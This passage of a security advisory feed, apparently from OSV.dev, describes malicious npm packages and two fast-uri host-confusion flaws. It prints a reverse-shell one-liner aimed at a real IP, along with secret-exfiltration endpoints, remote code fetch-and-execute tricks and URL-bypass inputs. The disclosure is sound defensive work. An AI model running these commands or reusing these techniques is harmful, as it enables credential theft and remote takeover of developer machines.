-package.json declares a preinstall hook (&amp;quot;node preinstall.js || true&amp;quot;) that runs unconditionally on npm install. preinstall.js filters process.env for keys matching AWS|TOKEN|KEY|SECRET|PASS|API|GITHUB|NPM|DOCKER|DB|MONGO|REDIS|POSTGRES|MYSQL, bundles them with hostname, username, working directory, and CI context, base64-encodes the payload, and sends it via curl over plain HTTP to http://216.126.236.46/r.php. On non-Windows hosts the same script also executes a reverse-shell one-liner (bash -i &amp;gt;&amp;amp; /dev/tcp/216.126.236.46/4444 0&amp;gt;&amp;amp;1, with nc -e and python3 socket fallbacks), giving the operator of that endpoint interactive shell access …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/spc_login/v/1.0.0"&gt;https://www.npmjs.com/package/spc_login/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15622"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15621: Malicious code in gas-monitor (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15621</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15621"/>
-    <published>2026-08-31T16:41:24Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in gas-monitor (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;gas-monitor&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (b218a26d55f47d2b60f56267a03c299dbed364fe6393cd2f1230f364020bc79e)
-gas-monitor@1.1.0 impersonates eth-gas-reporter (author field set to `cgewecke`, source tree mirrored, README pivoted to generic &amp;#x27;multi-chain gas analytics&amp;#x27; marketing). index.js exports `log` as a mocha reporter; inside, a `var opt = 1; if (!opt) {...real reporter... } else { gestest(); }` guard makes the legitimate reporter branch unreachable and unconditionally invokes `utils.connectNet(...)`, which detached-spawns `node lib/syncResolve.js`. lib/syncResolve.js fetches a JavaScript string from https://api.jsonbin.io/v3/b/6a93356ada38895dfe21087c and executes it via `new Function.constructor(&amp;#x27;require&amp;#x27;, result)(require)`, giving the ope…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/gas-monitor/v/1.1.0"&gt;https://www.npmjs.com/package/gas-monitor/v/1.1.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15621"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-15570: Malicious code in node-net-pool (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15570</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15570"/>
-    <published>2026-08-29T21:28:49Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-vm9g-mp9v-6q5p"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in node-net-pool (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vm9g-mp9v-6q5p&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;node-net-pool&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (d9c6bb87249429b2a3f3791589075bf872a433bd47a33b152f6809ccf94b1328)
-package.json declares a postinstall hook (`node index.js`) that runs automatically on `npm install`. The shipped index.js contains no networking or connection-pool code — the entire file body is a ~6.3KB numeric byte array (`_s`) decoded by a custom LCG+XOR routine (`_d(a,k)` using state `p*0x41C64E6D+0x3039 &amp;amp; 0xFFFF` XORed byte-wise) and passed directly to `new Function(_d(_s,179))()`, dynamically evaluating the decoded payload on the installer&amp;#x27;s machine at install time. The manifest advertises the package as &amp;#x27;Node.js network connection pool utilities&amp;#x27; with `main: index.js`, but index.js exports nothing and only runs the obfuscated ex…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vm9g-mp9v-6q5p"&gt;https://github.com/advisories/GHSA-vm9g-mp9v-6q5p&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/node-net-pool/v/1.0.0"&gt;https://www.npmjs.com/package/node-net-pool/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15570"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15594: Malicious code in generate-schema-ethers (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15594</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15594"/>
-    <published>2026-08-30T07:59:14Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in generate-schema-ethers (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;generate-schema-ethers&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (794f10449a8a47c4428b68edcff212be94917e229322394e9dda43e4c5b2b2e0)
-On require()/npx invocation, bin/cli.js runs `whoami` and POSTs the OS username, hostname, platform, and package name as JSON to the hardcoded URL https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9. The exfiltration fires unconditionally with no advertised feature justifying the network call, no user consent, and no configurability. The package name resembles legitimate schema-generation tooling, consistent with a typosquat/dependency-confusion reconnaissance beacon.
-
-## Source: ossf-package-analysis (1b03df588fe1ae0b803b15d5b2b66efc516887314c772e3190af2916b9d9f3cf)
-The OpenSSF Package Analysis project identified &amp;#x27;generate-schema…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/generate-schema-ethers/v/1.0.0"&gt;https://www.npmjs.com/package/generate-schema-ethers/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15594"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-15597: Malicious code in npx-oob-package (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15597</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15597"/>
-    <published>2026-08-29T20:55:31Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in npx-oob-package (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;npx-oob-package&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (6302c47700c024cb727f6139b5cd8703da7c295555525ce9624c12b536f76dde)
-npx-oob-package ships bin/cli.js which is also declared as the package main. On both CLI invocation and any require()/import of the package, the module collects local identifiers (whoami / os.userInfo(), os.hostname(), os.platform()) along with the package name and POSTs them via fetch() to a hardcoded Cloudflare Workers endpoint at https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9. The callback destination is not configurable and there is no user consent or opt-out. The package presents as an out-of-band (OOB) beacon consistent with dependency-confusion or pentest-style reconnaissance, causing installer host and user identifier…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/npx-oob-package/v/1.0.2"&gt;https://www.npmjs.com/package/npx-oob-package/v/1.0.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15597"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15595: Malicious code in generate-schema-viem (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15595</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15595"/>
-    <published>2026-08-30T07:59:20Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in generate-schema-viem (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;generate-schema-viem&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (82b43ea1e723ebd0c0ef5c4cd564b106089f9b5f9fd119dcac26dc1e130a14bf)
-Package publishes as `generate-schema-viem` but exposes a bin named `generate-schema-ethers` (a dependency-confusion / typosquat shape against the `generate-schema-*` namespace). On CLI invocation, `bin/cli.js` executes `whoami`, reads `os.hostname()` and platform, and POSTs `{pkg, whoami, hostname, platform}` to the hardcoded endpoint `https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9`. The manifest&amp;#x27;s own description self-labels the package as an OOB callback. Installer identity is leaked to an external attacker-controlled endpoint whenever the tool is invoked on a developer machine or CI runner.
-
-## Source: ossf-package-analys…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/generate-schema-viem/v/1.0.0"&gt;https://www.npmjs.com/package/generate-schema-viem/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15595"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-15569: Malicious code in nuvyra-marketplace-sdk (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15569</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15569"/>
-    <published>2026-08-29T19:26:31Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-rq2p-956p-32h6"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in nuvyra-marketplace-sdk (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-rq2p-956p-32h6&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nuvyra-marketplace-sdk&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (5db08e65aec25f1dc4fd0c33173154dbd0e6ef6e79aa2f1b7f8b4f8df0b9a3a8)
-dist/client.js executes initializeProvider() at module top level, so the code runs whenever a consumer require()s or imports this SDK. The function reconstructs a dependency specifier at runtime via [&amp;quot;ht&amp;quot;,&amp;quot;ps&amp;quot;,&amp;quot;-&amp;quot;,&amp;quot;pro&amp;quot;,&amp;quot;vider&amp;quot;].join(&amp;quot;&amp;quot;).replace(&amp;quot;ps&amp;quot;,&amp;quot;ps-&amp;quot;) — an obfuscation that resolves to a package named https-provider — rather than referencing it as a plain string. Before performing the dynamic import(), the loader checks environment signals (CI, USER, NODE_ENV=test) and returns without loading when those indicate a sandbox or automated-analysis environment; on a real host it awaits import(pkg), instantiates the imported default exp…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rq2p-956p-32h6"&gt;https://github.com/advisories/GHSA-rq2p-956p-32h6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.14"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.14&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.11"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.11&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.13"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.13&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.2"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.12"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.12&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.7"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.9"&gt;https://www.npmjs.com/package/nuvyra-marketplace-sdk/v/1.0.9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15569"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15586: Malicious code in originaldevelopmentstelemetry (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15586</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15586"/>
-    <published>2026-08-30T16:33:56Z</published>
-    <updated>2026-08-31T17:30:11Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-m8hq-jrvf-g8xm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in originaldevelopmentstelemetry (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-m8hq-jrvf-g8xm&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;originaldevelopmentstelemetry&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (60940a80ca72863b54a3cc8f1cc7da49be77b38e9111d4cb77cfc1417671f399)
-The package is advertised as a telemetry utility but its sole exported function, `downloadAndRunClient`, downloads `updater.hta` from `raw.githubusercontent.com/Acevatex/Testprogram/main/updater.hta` (an unrelated personal GitHub account, on the mutable `main` branch, with no pinning and no hash or signature check), writes it to a temporary path, and launches it via Windows `mshta` as a detached process. HTA execution grants the remote repository owner arbitrary code execution on any Windows host that invokes this function, and the fetched content can change at any time without a new package release. The stated &amp;#x27;telemetry&amp;#x27; purpose is i…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-m8hq-jrvf-g8xm"&gt;https://github.com/advisories/GHSA-m8hq-jrvf-g8xm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/originaldevelopmentstelemetry/v/1.2.7"&gt;https://www.npmjs.com/package/originaldevelopmentstelemetry/v/1.2.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/originaldevelopmentstelemetry/v/1.2.2"&gt;https://www.npmjs.com/package/originaldevelopmentstelemetry/v/1.2.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15586"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-4c8g-83qw-93j6: fast-uri vulnerable to host confusion via failed IDN canonicalization</title>
-    <id>https://osv.dev/vulnerability/GHSA-4c8g-83qw-93j6</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-4c8g-83qw-93j6"/>
-    <published>2026-07-21T19:03:11Z</published>
-    <updated>2026-08-31T15:45:51Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-13676"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;fast-uri vulnerable to host confusion via failed IDN canonicalization&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-13676&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;fast-uri&lt;/code&gt; — fixed in 4.0.1&lt;/li&gt;&lt;li&gt;&lt;code&gt;fast-uri&lt;/code&gt; — fixed in 3.1.3&lt;/li&gt;&lt;li&gt;&lt;code&gt;fast-uri&lt;/code&gt; — fixed in 2.4.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
-
-`fast-uri` versions `&amp;gt;= 2.3.1, &amp;lt;= 4.0.0` fail to canonicalize Unicode/IDN hostnames for HTTP-family URLs. The IDN conversion path calls `URL.domainToASCII(...)` on the global WHATWG `URL` constructor, where that helper does not exist. The resulting `TypeError` is silently routed into `parsed.error`, but `parse()`, `normalize()`, and `equal()` all return with the host left in its original Unicode form.
-
-For example, `http://127。0。0。1/` is treated by `fast-uri` as host `127。0。0。1`, while Node&amp;#x27;s WHATWG URL parser and `fetch()` canonicalize the same input to `127.0.0.1`.
-
-Applications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) before passing the same URL into Node&amp;#x27;s URL or `fetch()` consumers see a p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/security/advisories/GHSA-4c8g-83qw-93j6"&gt;https://github.com/fastify/fast-uri/security/advisories/GHSA-4c8g-83qw-93j6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-13676"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-13676&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/pull/188"&gt;https://github.com/fastify/fast-uri/pull/188&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/commit/2a6d357a18a68e6d812824379fd3388a1ae50d05"&gt;https://github.com/fastify/fast-uri/commit/2a6d357a18a68e6d812824379fd3388a1ae50d05&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/commit/21ea1f9d70495c931f55dff893a8fa38f4f2e6bd"&gt;https://github.com/fastify/fast-uri/commit/21ea1f9d70495c931f55dff893a8fa38f4f2e6bd&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/commit/01db48010f594b98f7b323be18b393791c66ed1d"&gt;https://github.com/fastify/fast-uri/commit/01db48010f594b98f7b323be18b393791c66ed1d&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:37186"&gt;https://access.redhat.com/errata/RHSA-2026:37186&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:54760"&gt;https://access.redhat.com/errata/RHSA-2026:54760&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-4c8g-83qw-93j6"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-v39h-62p7-jpjc: fast-uri vulnerable to host confusion via percent-encoded authority delimiters</title>
-    <id>https://osv.dev/vulnerability/GHSA-v39h-62p7-jpjc</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-v39h-62p7-jpjc"/>
-    <published>2026-05-08T19:13:01Z</published>
-    <updated>2026-08-31T15:45:51Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-6322"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;fast-uri vulnerable to host confusion via percent-encoded authority delimiters&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-6322&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;fast-uri&lt;/code&gt; — fixed in 3.1.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;fast-uri&lt;/code&gt; — fixed in 2.4.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
-
-`fast-uri` v3.1.1 and earlier decodes percent-encoded authority delimiters (`%40` as `@`, `%3A` as `:`) inside the host component and serializes them back as raw characters. This changes the URI structure, turning a hostname into userinfo plus a different host.
-
-For example, `http://trusted.com%40evil.com/` normalizes to `http://trusted.com@evil.com/`, which reparses as host `evil.com` with userinfo `trusted.com`.
-
-Applications that normalize untrusted URLs before host allowlist checks, redirect validation, or outbound request routing can be steered to a different authority than the original URL appeared to contain.
-
-### Patches
-
-Upgrade to `fast-uri` &amp;gt;= 3.1.2, or if you are in the v2.x release line, v2.4.1
-
-### Workarounds
-
-None. Upgrade to the patched version.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/fastify/fast-uri/security/advisories/GHSA-v39h-62p7-jpjc"&gt;https://github.com/fastify/fast-uri/security/advisories/GHSA-v39h-62p7-jpjc&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6322"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6322&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:25271"&gt;https://access.redhat.com/errata/RHSA-2026:25271&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:41928"&gt;https://access.redhat.com/errata/RHSA-2026:41928&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:41951"&gt;https://access.redhat.com/errata/RHSA-2026:41951&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:42078"&gt;https://access.redhat.com/errata/RHSA-2026:42078&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:42142"&gt;https://access.redhat.com/errata/RHSA-2026:42142&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://access.redhat.com/errata/RHSA-2026:43038"&gt;https://access.redhat.com/errata/RHSA-2026:43038&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-v39h-62p7-jpjc"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-15604: Malicious code in @worrisome/reutil (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15604</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15604"/>
-    <published>2026-08-26T14:55:09Z</published>
-    <updated>2026-08-31T07:15:14Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @worrisome/reutil (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@worrisome/reutil&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Published as part of a ClickFix-style fake-CAPTCHA phishing campaign documented by OX Security (see reference). The package&amp;#x27;s only file is index.html, declared as the npm &amp;quot;main&amp;quot; entry; package.json defines no preinstall/install/postinstall/prepare lifecycle script, so the payload does not execute at `npm install` time. index.html renders a fake Cloudflare Turnstile verification widget. An obfuscator.io-obfuscated inline script POSTs a hardcoded per-package &amp;quot;hostKey&amp;quot; to https://api.keyval.org/get, receives a base64-encoded IV:ciphertext pair, decrypts it client-side via the Web Crypto API (AES-CTR) using an embedded key to obtain a redirect URL, appends the visitor&amp;#x27;s original query-string parameters, and navigates the browser there via window.location.replace(). This &amp;quot;dead drop&amp;quot; design lets…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.ox.security/blog/research-clickfix-phishing-npm-packages/"&gt;https://www.ox.security/blog/research-clickfix-phishing-npm-packages/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@worrisome/reutil/v/1.0.3"&gt;https://www.npmjs.com/package/@worrisome/reutil/v/1.0.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15604"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15600: Malicious code in @lucideproxy/svg (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15600</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15600"/>
-    <published>2026-08-30T23:25:26Z</published>
-    <updated>2026-08-31T01:15:10Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-6j97-93gg-j7r8"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @lucideproxy/svg (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-6j97-93gg-j7r8&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@lucideproxy/svg&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (c00e810f5961798d82a45678ccddfa58f15503ed24c6cad677a6ee854d86d7fb)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6j97-93gg-j7r8"&gt;https://github.com/advisories/GHSA-6j97-93gg-j7r8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15600"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-15596: Malicious code in grafeno-actions (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15596</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15596"/>
-    <published>2026-08-28T22:20:34Z</published>
-    <updated>2026-08-30T23:30:10Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in grafeno-actions (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;grafeno-actions&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ossf-package-analysis (3a52df88a9094028961676cb72f9e43f88fcef959cc4e1db63687785058c2d7d)
-The OpenSSF Package Analysis project identified &amp;#x27;grafeno-actions&amp;#x27; @ 999.0.0 (npm) as malicious.
-
-It is considered malicious because:
-
-- The package executes one or more commands associated with malicious behavior.
-&lt;/p&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15596"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15580: Malicious code in brat-codex (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15580</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15580"/>
-    <published>2026-08-30T16:35:22Z</published>
-    <updated>2026-08-30T17:30:15Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-63wg-22hx-h5q4"/>
